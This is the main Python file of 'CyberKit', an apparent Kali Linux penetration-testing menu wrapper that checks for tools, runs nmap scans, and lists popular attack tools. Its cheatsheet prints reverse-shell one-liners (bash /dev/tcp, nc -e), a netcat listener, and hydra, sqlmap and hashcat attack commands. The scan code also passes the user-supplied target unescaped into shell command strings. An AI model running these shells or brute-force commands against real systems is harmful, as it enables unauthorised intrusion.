#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CyberKit - All-in-One Cybersecurity Toolkit for Kali Linux
Main Entry Point
"""

import os
import sys
import io

# Windows UTF-8 encoding fix
if os.name == 'nt':
    try:
        sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
        sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')
    except:
        pass

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from cyberkit.utils.colors import *
from cyberkit.utils.helpers import *
from cyberkit.utils.logger import get_logger
from cyberkit.utils.config_loader import get_config
from cyberkit.utils.exceptions import handle_exceptions, ErrorHandler
from cyberkit.modules.network_scanner import NetworkScanner
from cyberkit.modules.web_scanner import WebScanner
from cyberkit.modules.osint import OSINTModule
from cyberkit.modules.password_tools import PasswordTools
from cyberkit.modules.exploitation import ExploitationModule
from cyberkit.modules.report_generator import ReportGenerator
from cyberkit.modules.custom_runner import CustomRunner
from cyberkit.modules.auto_recon import AutoRecon
from cyberkit.modules.wireless_tools import WirelessTools
from cyberkit.modules.ad_tools import ADTools
from cyberkit.modules.encoding_tools import EncodingTools
from cyberkit.modules.cloud_tools import CloudTools
from cyberkit.modules.utility_tools import UtilityTools

VERSION = "2.0.0"

BANNER = f"""
{Colors.CYAN}
    ██████╗██╗   ██╗██████╗ ███████╗██████╗ ██╗  ██╗██╗████████╗
   ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗██║ ██╔╝██║╚══██╔══╝
   ██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝█████╔╝ ██║   ██║   
   ██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗██╔═██╗ ██║   ██║   
   ╚██████╗   ██║   ██████╔╝███████╗██║  ██║██║  ██╗██║   ██║   
    ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝   ╚═╝   
{Colors.END}
{Colors.YELLOW}         ══════ All-in-One Cybersecurity Toolkit ══════{Colors.END}
{Colors.GREEN}                        Version {VERSION}{Colors.END}
"""

POPULAR_TOOLS = {
    "nmap": "Network scanner & port discovery",
    "gobuster": "Directory/DNS bruteforce",
    "nikto": "Web server vulnerability scanner",
    "sqlmap": "SQL injection automation",
    "hydra": "Login bruteforce attacks",
    "john": "Password hash cracker",
    "metasploit": "Exploitation framework",
    "burpsuite": "Web security testing",
}

def draw_line(char="═", length=60):
    return f"{Colors.CYAN}{char * length}{Colors.END}"

def draw_box(title, width=60):
    print(f"\n{Colors.CYAN}╔{'═' * (width-2)}╗{Colors.END}")
    print(f"{Colors.CYAN}║{Colors.BOLD}{Colors.WHITE}{title.center(width-2)}{Colors.END}{Colors.CYAN}║{Colors.END}")
    print(f"{Colors.CYAN}╚{'═' * (width-2)}╝{Colors.END}")

def check_dependencies():
    """Check for required tools and display status"""
    clear_screen()
    draw_box("TOOL STATUS CHECK", 60)
    
    tools = {
        "nmap": "Network Scanner",
        "gobuster": "Dir Bruteforce",
        "nikto": "Web Scanner",
        "sqlmap": "SQL Injection",
        "hydra": "Brute Force",
        "john": "Hash Cracker",
        "hashcat": "GPU Cracker",
        "msfconsole": "Metasploit",
        "searchsploit": "Exploit-DB",
        "whatweb": "Web Fingerprint",
        "theHarvester": "OSINT",
        "ffuf": "Web Fuzzer",
        "wpscan": "WordPress Scan",
        "sslscan": "SSL Analysis",
    }
    
    print(f"\n  {'Tool':<15} {'Status':<10} {'Description'}")
    print(f"  {'-'*15} {'-'*10} {'-'*20}")
    
    installed = 0
    for cmd, desc in tools.items():
        if check_tool(cmd):
            status = f"{Colors.GREEN}[✓] OK{Colors.END}"
            installed += 1
        else:
            status = f"{Colors.RED}[✗] Missing{Colors.END}"
        print(f"  {cmd:<15} {status:<20} {Colors.GRAY}{desc}{Colors.END}")
    
    print(f"\n  {draw_line('─', 50)}")
    print(f"  {Colors.BOLD}Total: {Colors.GREEN}{installed}{Colors.END}/{len(tools)} tools installed")
    
    if not check_root():
        print(f"\n  {Colors.YELLOW}[!] Some features require root privileges{Colors.END}")
    
    input(f"\n  Press Enter to continue...")

def quick_scan_menu():
    """Quick scan options"""
    clear_screen()
    draw_box("QUICK SCAN", 60)
    
    target = get_input("\n  Target IP/Domain")
    if not target:
        return
    
    print(f"""
  {Colors.YELLOW}Select Scan Type:{Colors.END}
  
  {Colors.CYAN}[1]{Colors.END}  Quick Port Scan (Top 100)
  {Colors.CYAN}[2]{Colors.END}  Service Detection
  {Colors.CYAN}[3]{Colors.END}  Web Technology Detection
  {Colors.CYAN}[4]{Colors.END}  All Basic Scans
    """)
    
    choice = get_input("  Select", "4")
    output_dir = create_output_dir("output/quick_scan")
    timestamp = get_timestamp()
    
    if choice in ["1", "4"]:
        print_status("\n  Running port scan...")
        cmd = f"nmap -T4 -F -oN {output_dir}/ports_{timestamp}.txt {target}"
        run_command_live(cmd)
    
    if choice in ["2", "4"]:
        print_status("\n  Running service detection...")
        cmd = f"nmap -sV -T4 --top-ports 100 -oN {output_dir}/services_{timestamp}.txt {target}"
        run_command_live(cmd)
    
    if choice in ["3", "4"]:
        if check_tool("whatweb"):
            print_status("\n  Running web fingerprint...")
            cmd = f"whatweb -a 3 {target}"
            run_command_live(cmd)
    
    print_success(f"\n  Results saved to: {output_dir}/")
    input("\n  Press Enter to continue...")

def show_popular_tools():
    """Display most popular/used tools"""
    clear_screen()
    draw_box("MOST USED TOOLS", 60)
    
    print(f"""
  {Colors.BOLD}Reconnaissance & Scanning:{Colors.END}
  ─────────────────────────
  {Colors.CYAN}nmap{Colors.END}        → Port scanning, service detection, OS fingerprint
  {Colors.CYAN}masscan{Colors.END}     → Fast port scanner for large networks
  {Colors.CYAN}rustscan{Colors.END}    → Modern fast port scanner

  {Colors.BOLD}Web Application Testing:{Colors.END}
  ────────────────────────
  {Colors.CYAN}burpsuite{Colors.END}   → Web proxy and vulnerability scanner
  {Colors.CYAN}gobuster{Colors.END}    → Directory and DNS bruteforce
  {Colors.CYAN}ffuf{Colors.END}        → Fast web fuzzer
  {Colors.CYAN}sqlmap{Colors.END}      → Automatic SQL injection
  {Colors.CYAN}nikto{Colors.END}       → Web server vulnerability scanner
  {Colors.CYAN}wpscan{Colors.END}      → WordPress vulnerability scanner

  {Colors.BOLD}Password Attacks:{Colors.END}
  ─────────────────
  {Colors.CYAN}john{Colors.END}        → Password hash cracker
  {Colors.CYAN}hashcat{Colors.END}     → GPU-accelerated hash cracker
  {Colors.CYAN}hydra{Colors.END}       → Online password bruteforce

  {Colors.BOLD}Exploitation:{Colors.END}
  ─────────────
  {Colors.CYAN}metasploit{Colors.END}  → Exploitation framework
  {Colors.CYAN}searchsploit{Colors.END}→ Exploit-DB search
  {Colors.CYAN}netcat{Colors.END}      → Network Swiss Army knife

  {Colors.BOLD}OSINT & Recon:{Colors.END}
  ──────────────
  {Colors.CYAN}theHarvester{Colors.END}→ Email and subdomain harvesting
  {Colors.CYAN}sherlock{Colors.END}    → Social media username search
  {Colors.CYAN}recon-ng{Colors.END}    → OSINT framework
    """)
    
    input("\n  Press Enter to continue...")

def show_cheatsheet():
    """Display useful commands cheatsheet"""
    clear_screen()
    draw_box("CHEATSHEET", 60)
    
    print(f"""
  {Colors.BOLD}{Colors.CYAN}[NMAP]{Colors.END}
  nmap -sV -sC -p- target          # Full scan
  nmap -sU --top-ports 100 target  # UDP scan
  nmap --script=vuln target        # Vuln scan
  nmap -sn 192.168.1.0/24          # Ping sweep

  {Colors.BOLD}{Colors.CYAN}[WEB]{Colors.END}
  gobuster dir -u URL -w wordlist  # Dir bruteforce
  ffuf -u URL/FUZZ -w wordlist     # Fuzzing
  nikto -h URL                     # Web vuln scan
  sqlmap -u "URL?id=1" --dbs       # SQL injection
  wpscan --url URL -e vp,vt,u      # WordPress scan

  {Colors.BOLD}{Colors.CYAN}[PASSWORD]{Colors.END}
  john --wordlist=rockyou hash     # John
  hashcat -m 0 hash wordlist       # MD5
  hydra -l user -P list ssh://IP   # SSH brute

  {Colors.BOLD}{Colors.CYAN}[EXPLOITATION]{Colors.END}
  msfconsole                       # Metasploit
  searchsploit apache 2.4          # Exploit search
  nc -lvnp 4444                    # Listener

  {Colors.BOLD}{Colors.CYAN}[SHELLS]{Colors.END}
  bash -i >& /dev/tcp/IP/PORT 0>&1
  nc -e /bin/sh IP PORT
  python3 -c 'import pty;pty.spawn("/bin/bash")'

  {Colors.BOLD}{Colors.CYAN}[FILE TRANSFER]{Colors.END}
  python3 -m http.server 8000      # HTTP server
  wget http://IP:8000/file         # Download
    """)
    input("\n  Press Enter to continue...")

def main_menu():
    """Main menu loop"""
    network_scanner = NetworkScanner()
    web_scanner = WebScanner()
    osint_module = OSINTModule()
    password_tools = PasswordTools()
    exploitation = ExploitationModule()
    report_generator = ReportGenerator()
    custom_runner = CustomRunner()
    auto_recon = AutoRecon()
    wireless_tools = WirelessTools()
    ad_tools = ADTools()
    encoding_tools = EncodingTools()
    cloud_tools = CloudTools()
    utility_tools = UtilityTools()
    
    while True:
        clear_screen()
        print(BANNER)
        
        print(f"""
{Colors.CYAN}╔══════════════════════════════════════════════════════════════╗
║                      MAIN MENU v2.0                          ║
╠══════════════════════════════════════════════════════════════╣{Colors.END}
║  {Colors.CYAN}[1]{Colors.END}  Network Scanner       {Colors.CYAN}[2]{Colors.END}  Web Scanner              ║
║  {Colors.CYAN}[3]{Colors.END}  OSINT / Recon         {Colors.CYAN}[4]{Colors.END}  Password Tools           ║
║  {Colors.CYAN}[5]{Colors.END}  Exploitation          {Colors.CYAN}[6]{Colors.END}  Report Generator         ║
{Colors.CYAN}╠══════════════════════════════════════════════════════════════╣{Colors.END}
║  {Colors.GREEN}[7]{Colors.END}  Custom Multi-Tool     {Colors.GREEN}[8]{Colors.END}  Auto Recon Pipeline      ║
║  {Colors.GREEN}[9]{Colors.END}  Wireless Tools        {Colors.GREEN}[10]{Colors.END} AD/Domain Tools          ║
║  {Colors.GREEN}[11]{Colors.END} Encoding/Decoding     {Colors.GREEN}[12]{Colors.END} Cloud Security           ║
║  {Colors.GREEN}[13]{Colors.END} Utility Tools                                        ║
{Colors.CYAN}╠══════════════════════════════════════════════════════════════╣{Colors.END}
║  {Colors.YELLOW}[14]{Colors.END} Quick Scan            {Colors.YELLOW}[15]{Colors.END} Cheatsheet               ║
║  {Colors.YELLOW}[16]{Colors.END} Tool Status           {Colors.YELLOW}[17]{Colors.END} Popular Tools            ║
{Colors.CYAN}╠══════════════════════════════════════════════════════════════╣{Colors.END}
║  {Colors.RED}[0]{Colors.END}  Exit                                                   ║
{Colors.CYAN}╚══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        choice = get_input("  Select")
        
        if choice == "0":
            print_info("\n  CyberKit shutting down...")
            sys.exit(0)
        elif choice == "1":
            network_scanner.show_menu()
        elif choice == "2":
            web_scanner.show_menu()
        elif choice == "3":
            osint_module.show_menu()
        elif choice == "4":
            password_tools.show_menu()
        elif choice == "5":
            exploitation.show_menu()
        elif choice == "6":
            report_generator.show_menu()
        elif choice == "7":
            custom_runner.show_menu()
        elif choice == "8":
            auto_recon.show_menu()
        elif choice == "9":
            wireless_tools.show_menu()
        elif choice == "10":
            ad_tools.show_menu()
        elif choice == "11":
            encoding_tools.show_menu()
        elif choice == "12":
            cloud_tools.show_menu()
        elif choice == "13":
            utility_tools.show_menu()
        elif choice == "14":
            quick_scan_menu()
        elif choice == "15":
            show_cheatsheet()
        elif choice == "16":
            check_dependencies()
        elif choice == "17":
            show_popular_tools()
        else:
            print_error("Invalid selection!")
            input("\n  Press Enter to continue...")

def main():
    """Main entry point"""
    try:
        if len(sys.argv) > 1:
            if sys.argv[1] in ["-h", "--help"]:
                print(f"""
{Colors.CYAN}CyberKit - All-in-One Cybersecurity Toolkit{Colors.END}

Usage: python3 cyberkit.py [option]

Options:
  -h, --help     Show this help message
  -v, --version  Show version
  -c, --check    Check tool status

Run without arguments for interactive mode.
                """)
                sys.exit(0)
            elif sys.argv[1] in ["-v", "--version"]:
                print(f"{Colors.CYAN}CyberKit v{VERSION}{Colors.END}")
                sys.exit(0)
            elif sys.argv[1] in ["-c", "--check"]:
                check_dependencies()
                sys.exit(0)
        
        main_menu()
        
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Interrupted with Ctrl+C{Colors.END}")
        sys.exit(0)
    except Exception as e:
        print_error(f"Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
